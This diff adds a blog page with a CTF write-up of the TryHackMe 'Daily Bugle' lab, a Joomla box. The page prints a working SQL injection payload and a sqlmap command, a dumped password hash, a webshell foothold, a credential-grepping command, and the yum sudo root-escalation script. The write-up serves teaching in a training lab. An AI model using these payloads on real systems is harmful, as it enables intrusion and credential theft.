@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daily Bugle CTF Writeup | Jeremy Laratro</title>
+    <link rel="stylesheet" href="../../css/main.css">
+    <link rel="stylesheet" href="../../css/effects.css">
+    <link rel="stylesheet" href="../../css/pages.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        .blog-post-content {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .blog-post-header {
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .blog-post-title {
+            font-family: var(--font-display);
+            font-size: 2rem;
+            color: var(--text-primary);
+            margin-bottom: 1rem;
+        }
+        .blog-post-meta {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+        .blog-post-body {
+            font-size: 1rem;
+            line-height: 1.8;
+            color: var(--text-secondary);
+        }
+        .blog-post-body h2 {
+            font-family: var(--font-display);
+            font-size: 1.5rem;
+            color: var(--accent-blue);
+            margin: 2.5rem 0 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .blog-post-body h3 {
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            color: var(--text-primary);
+            margin: 2rem 0 1rem;
+        }
+        .blog-post-body p {
+            margin-bottom: 1.5rem;
+        }
+        .blog-post-body pre {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+        .blog-post-body code {
+            background: var(--bg-tertiary);
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            font-family: var(--font-mono);
+            font-size: 0.9em;
+            color: var(--accent-green);
+        }
+        .blog-post-body pre code {
+            background: transparent;
+            padding: 0;
+        }
+        .blog-post-body ul, .blog-post-body ol {
+            margin: 1rem 0 1.5rem 1.5rem;
+        }
+        .blog-post-body li {
+            margin-bottom: 0.5rem;
+        }
+        .blog-post-body blockquote {
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            color: var(--text-muted);
+            font-style: italic;
+        }
+        .blog-post-body a {
+            color: var(--accent-blue);
+            text-decoration: none;
+        }
+        .blog-post-body a:hover {
+            text-decoration: underline;
+        }
+        .blog-tags {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-top: 1rem;
+        }
+        .blog-tag {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            padding: 0.3rem 0.6rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            color: var(--accent-blue);
+        }
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-bottom: 2rem;
+            transition: var(--transition-normal);
+        }
+        .back-link:hover {
+            color: var(--accent-blue);
+        }
+        .external-link {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.75rem 1.5rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--accent-blue);
+            border-radius: 6px;
+            color: var(--accent-blue);
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            text-decoration: none;
+            transition: var(--transition-normal);
+        }
+        .external-link:hover {
+            background: var(--accent-blue);
+            color: var(--bg-primary);
+        }
+    </style>
+</head>
+<body>
+    <!-- CRT Effect -->
+    <div class="crt"></div>
+
+    <!-- Grid Background -->
+    <div class="grid-bg"></div>
+
+    <!-- Classification Bar -->
+    <div class="class-bar"></div>
+
+    <!-- Tactical Frame -->
+    <div class="tactical-frame"></div>
+    <div class="tactical-frame-bottom"></div>
+
+    <!-- Navigation -->
+    <nav class="cyber-nav">
+        <div class="nav-container">
+            <div style="display: flex; align-items: center;">
+                <a href="../../index.html" class="nav-logo">
+                    <span class="logo-bracket">[</span>
+                    <span class="logo-text">JL</span>
+                    <span class="logo-bracket">]</span>
+                </a>
+                <span class="logo-tag">CYBER OPS</span>
+            </div>
+            <div class="nav-links">
+                <a href="../../index.html" class="nav-link">./home</a>
+                <a href="../about.html" class="nav-link">./whoami</a>
+                <a href="../cyber-projects.html" class="nav-link">./cyberops</a>
+                <a href="../projects.html" class="nav-link">./research</a>
+                <a href="../blog.html" class="nav-link active">./intel</a>
+                <a href="../contact.html" class="nav-link">./comms</a>
+            </div>
+            <button class="nav-toggle" aria-label="Toggle menu">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="page-content">
+        <div class="blog-post-content">
+            <a href="../blog.html" class="back-link">&larr; Back to Blog</a>
+
+            <article>
+                <header class="blog-post-header">
+                    <h1 class="blog-post-title">THM - Daily Bugle CTF Writeup</h1>
+                    <div class="blog-post-meta">
+                        <span>Published: November 2022</span>
+                        <span>Platform: TryHackMe</span>
+                        <span>Difficulty: Hard</span>
+                    </div>
+                    <div class="blog-tags">
+                        <span class="blog-tag">CTF</span>
+                        <span class="blog-tag">TryHackMe</span>
+                        <span class="blog-tag">SQLi</span>
+                        <span class="blog-tag">Joomla</span>
+                        <span class="blog-tag">Linux</span>
+                        <span class="blog-tag">Privilege Escalation</span>
+                    </div>
+                    <a href="https://medium.com/system-weakness/cyber-security-ctf-daily-bugle-tryhackme-com-3c104bdab3de" target="_blank" class="external-link">Read on Medium (System Weakness) &rarr;</a>
+                </header>
+
+                <div class="blog-post-body">
+                    <p>Link to the room: <a href="https://tryhackme.com/room/dailybugle" target="_blank">https://tryhackme.com/room/dailybugle</a></p>
+
+                    <h2>Initial Scans</h2>
+                    <pre><code>whatweb:
+http://10.10.141.227/ [200 OK] Apache[2.4.6], Bootstrap,
+Cookies[eaa83fe8b963ab08ce9ab7d4a798de05], Country[RESERVED][ZZ], HTML5,
+HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40],
+HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], IP[10.10.141.227], JQuery,
+MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40],
+PasswordField[password],
+Script[application/json], Title[Home], X-Powered-By[PHP/5.6.40]
+
+---
+Nmap:
+Nmap scan report for 10.10.141.227
+Host is up (1.5s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+3306/tcp open  mysql</code></pre>
+
+                    <h2>The Webpage</h2>
+                    <p>The landing page consists of a mock news media site, with a login panel prompting username and password on the right side.</p>
+                    <ul>
+                        <li>We know that this CTF will contain SQLi, so this may be our entry point</li>
+                        <li>We know from both the CTF as well as the whatweb scan that the site is using the Joomla CMS</li>
+                    </ul>
+
+                    <h2>SQLi Exploitation</h2>
+                    <p>The first step I took after making my initial scans was to look up known Joomla SQLi vulnerabilities. I don't [yet] know the Joomla version, but <a href="https://www.exploit-db.com/exploits/42033" target="_blank">CVE-2017-8917</a> pops up immediately on google and the exploitDB page even gives a sqlmap example command!</p>
+
+                    <p>The vulnerable parameters/URL is:</p>
+                    <pre><code>http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27</code></pre>
+
+                    <p>Specifically, the "com_fields" parameter is injectable.</p>
+
+                    <h3>Error-based payload:</h3>
+                    <pre><code>option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)b)c)</code></pre>
+
+                    <p>After entering the payload, I did indeed receive an error:</p>
+                    <pre><code>500 Duplicate entry 'qqvpq1qjpvq1' for key 'group_key'</code></pre>
+
+                    <p>After experimenting with the requests for a bit longer, I decided to go to sqlmap and used the -r switch with a text file containing a request from burp with the vulnerable parameters:</p>
+                    <pre><code>sqlmap -r request.txt --users --passwords --tables --random-agent</code></pre>
+
+                    <p>This returned a user entry and hash:</p>
+                    <pre><code>Database: joomla
+Table: #__users
+[1 entry]
++-----+------------+--------------------------------------------------------------+----------+
+| id  | name       | password                                                     | username |
++-----+------------+--------------------------------------------------------------+----------+
+| 811 | Super User | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
++-----+------------+--------------------------------------------------------------+----------+</code></pre>
+
+                    <p>The hash is encrypted with blowfish/bcrypt. After running hashcat, the password was cracked.</p>
+
+                    <h2>Foothold</h2>
+                    <blockquote>We now are authenticated on the website as user jonah -- "Super User." The next step is to transition to get a foothold on the actual machine.</blockquote>
+
+                    <p>Since we have what appears to be admin rights, it may be possible to upload a webshell via the administrator panel. I downloaded a random poll extension, replaced the install script with a webshell, zipped it, uploaded, and got my shell.</p>
+
+                    <p>I upgraded the shell with:</p>
+                    <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+                    <p>After searching through the system, I found credentials in the configuration.php file:</p>
+                    <pre><code>cat * | grep password</code></pre>
+
+                    <p>The password worked for user jjameson, and I obtained the user flag.</p>
+
+                    <h2>Privilege Escalation</h2>
+                    <p>Now that a password has been obtained, it is possible to check for sudo command access:</p>
+                    <pre><code>sudo -l
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum</code></pre>
+
+                    <p>With sudo access to yum, we can use the privesc method from GTFOBins to escalate to root:</p>
+                    <pre><code>TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y</code></pre>
+
+                    <p>This method creates a custom plugin that spawns a shell. After successfully executing this exploit and escalating privileges to root, we can obtain the root flag!</p>
+                </div>
+            </article>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="cyber-footer">
+        <div class="footer-content">
+            <div class="footer-status">
+                <span class="footer-dot"></span>
+                <span>SYSTEMS ONLINE</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://github.com/jeremylaratro" target="_blank" class="footer-link">[GitHub]</a>
+                <a href="https://www.linkedin.com/in/JeremyLaratro" target="_blank" class="footer-link">[LinkedIn]</a>
+            </div>
+            <div class="footer-copy">
+                &copy; <span id="year"></span> // Secure Channel
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
